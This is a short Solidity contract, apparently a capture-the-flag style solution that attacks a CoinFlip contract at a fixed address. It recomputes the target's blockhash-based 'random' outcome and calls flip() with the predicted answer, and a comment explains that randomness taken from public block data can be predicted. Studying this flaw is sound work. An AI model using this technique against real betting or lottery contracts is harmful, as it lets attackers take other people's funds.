// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./CoinFlip.sol";

contract CoinFlipSolution {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address coinFlipAddress;



    constructor() {
        coinFlipAddress = 0x107EE1cF4ef17F73952451549c82B7d59AbC094c;
    }

     // this "exploit" shows that we can not rely on randomness generated from hashing publicly available info (blocknumber) b/c anyone has access to it and can "mimic" that randomness b/c hashing is deterministic
    function headsOrTails() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip CoinFlipContract = CoinFlip(coinFlipAddress);
        
        if (side == true) {
            return CoinFlipContract.flip(true);
        } else {
            return CoinFlipContract.flip(false);
        }
    }

}